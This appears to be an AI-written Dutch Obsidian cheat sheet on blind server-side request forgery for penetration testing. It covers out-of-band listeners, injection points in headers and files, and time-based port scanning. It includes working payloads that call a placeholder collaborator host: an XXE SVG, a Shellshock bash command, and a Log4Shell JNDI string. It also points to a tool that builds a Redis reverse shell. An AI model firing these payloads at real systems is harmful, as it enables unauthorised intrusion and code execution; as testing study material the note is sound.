
Dit is de lastigste variant van SSRF, maar ook de meest voorkomende. Omdat de server **geen data terugstuurt** (je ziet de Google homepage niet), moet je de server dwingen om een signaal naar jou te sturen (Out-of-Band).

Hier is de complete Obsidian notitie voor **Blind SSRF**.

---

Markdown

````
# 🦇 Blind Server-Side Request Forgery (SSRF)

==Concept: De server voert het HTTP-verzoek uit, maar laat het resultaat niet zien in de frontend.==
*Detectie: Je moet "Out-of-Band" (OOB) interactie gebruiken. De server moet contact maken met een listener die jij beheert.*



---

## 📡 1. Setup: De Listener (OOB)
*Zonder een listener ben je blind. Je hebt een server nodig die logt wie er verbinding maakt.*

### Interactsh (De beste gratis optie)
Van ProjectDiscovery. Werkt via terminal.
```bash
# Installeer en start
go install -v [github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest](https://github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest)
interactsh-client -v
````

_Je krijgt nu een URL (bijv. `c5s2...o6j1.oast.pro`). Alles wat deze URL raakt, zie je in je terminal._

### Burp Collaborator (Burp Pro)

1. Ga naar tabblad **Collaborator**.
    
2. Klik "Copy to clipboard".
    
3. Injecteer deze link in de applicatie.
    
4. Klik "Poll now" om te zien of je hits hebt (DNS of HTTP).
    

---

## 🕵️‍♂️ 2. Detection (Waar injecteren?)

_Blind SSRF zit vaak verstopt in headers of secundaire processen._

### In de URL parameter (De basis)

Als `?url=` geen output geeft, check of hij wel DNS resolvet. `https://target.com/load?url=http://jouw-collaborator-id.com`

### In HTTP Headers (De "Hidden" SSRF)

Websites loggen vaak bezoekersinfo of verwerken analytics. Injecteer je payload hier:

HTTP

```
GET / HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 ([http://jouw-collaborator-id.com](http://jouw-collaborator-id.com))
Referer: [http://jouw-collaborator-id.com](http://jouw-collaborator-id.com)
X-Forwarded-For: jouw-collaborator-id.com
X-Real-IP: jouw-collaborator-id.com
CF-Connecting_IP: jouw-collaborator-id.com
From: admin@jouw-collaborator-id.com
```

_(Als je na een uur opeens een ping krijgt, heeft een interne log-tool of admin-panel je request verwerkt)._

### In Bestanden (PDF/XML/Images)

Upload een bestand dat de server dwingt externe bronnen op te halen.

**SVG (Image Magick exploit):**

XML

```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "[http://jouw-collaborator-id.com](http://jouw-collaborator-id.com)"> ]>
<svg width="128px" height="128px" xmlns="[http://www.w3.org/2000/svg](http://www.w3.org/2000/svg)" xmlns:xlink="[http://www.w3.org/1999/xlink](http://www.w3.org/1999/xlink)" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

---

## ⏳ 3. Internal Scanning (Time-Based)

_Je ziet geen resultaat, maar je kunt wel TIMING meten. Hiermee kun je interne poorten scannen._

**Logica:**

- Server verbindt met gesloten poort -> **Directe Error (Snel)**.
    
- Server verbindt met open poort (of firewall drop) -> **Timeout (Traag)**.
    

**Burp Intruder Attack:**

1. Stuur request naar Intruder.
    
2. Payload: `http://127.0.0.1:§port§`
    
3. Payloads: 1 t/m 10000.
    
4. **Belangrijk:** Zet in Intruder de kolom "Response Completed" of "Time" aan.
    
5. Sorteer op tijd.
    
    - _Alle requests:_ 50ms.
        
    - _Request poort 8080:_ 5000ms. -> **Poort 8080 is waarschijnlijk open.**
        

---

## 💣 4. Exploitation (Blind RCE)

_Blind SSRF zelf lekt geen data, maar je kunt het gebruiken om kwetsbare interne services aan te vallen (Chain)._

### Shellshock (Oude servers)

Als je een interne server vindt die kwetsbaar is voor Shellshock, kun je hem pingen via SSRF. **Payload in User-Agent:**

Plaintext

```
() { :; }; /bin/bash -c 'ping -c 3 jouw-collaborator-id.com'
```

### Log4Shell (Java Servers)

De beruchte Log4j bug werkt perfect via Blind SSRF. **Payload in parameters/headers:**

Plaintext

```
${jndi:ldap://[jouw-collaborator-id.com/a](https://jouw-collaborator-id.com/a)}
```

### Redis (Remote Code Execution)

Als je poort 6379 open vindt (via Time-Based scan), kun je Gopher gebruiken om commando's te sturen, zelfs blind. _Gebruik de tool **Gopherus** om de payload te genereren die een reverse shell start._

---

## 📝 Checklist Blind SSRF

- [ ] **OOB Tool:** Heb ik Interactsh of Collaborator open staan?
    
- [ ] **Protocollen:** Heb ik HTTP én DNS gecheckt? (Soms is HTTP geblokkeerd, maar DNS niet).
    
- [ ] **Headers:** Heb ik `Referer` en `User-Agent` geïnjecteerd?
    
- [ ] **PDFs:** Genereert de site PDF's? Injecteer HTML `img` tags.
    
- [ ] **Timing:** Heb ik gelet op tijdsverschillen bij het scannen van `127.0.0.1`?